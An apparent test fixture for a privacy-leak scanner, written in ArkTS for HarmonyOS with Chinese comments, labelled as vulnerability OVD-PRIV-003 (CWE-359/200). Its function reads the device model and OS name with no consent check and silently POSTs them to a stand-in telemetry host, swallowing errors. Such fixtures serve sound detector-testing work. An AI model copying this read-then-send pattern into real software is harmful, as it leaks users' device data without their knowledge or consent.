// VULN: OVD-PRIV-003 设备指纹读取→外传两步链（call-chain：读敏态字段后 request 外传，CWE-359/200）
// 规则语义：productModel 读取与 request 外传须依序出现（先取敏态再外传）
import { deviceInfo, BusinessError } from '@kit.BasicServicesKit';
import { http } from '@kit.NetworkKit';

export function ovdPriv003(): string {
  // 第一步：读设备敏态字段（无用户感知、无授权门）
  const fingerprint = `${deviceInfo.productModel}/${deviceInfo.osFullName}`;
  // 第二步：依序外传到遥测端点（call-chain 语义：read → request）
  let err = '';
  try {
    const req: http.HttpRequest = http.createHttp();
    req.request('https://vd-telemetry.example/fingerprint', {
      method: http.RequestMethod.POST,
      extraData: JSON.stringify({ fp: fingerprint }),
      readTimeout: 3000,
      connectTimeout: 3000
    }).catch(() => {});
    req.destroy();
  } catch (e) {
    err = ` (req err=${(e as BusinessError).code})`;
  }
  return `device fingerprint chained to telemetry${err}: ${fingerprint}`;
}
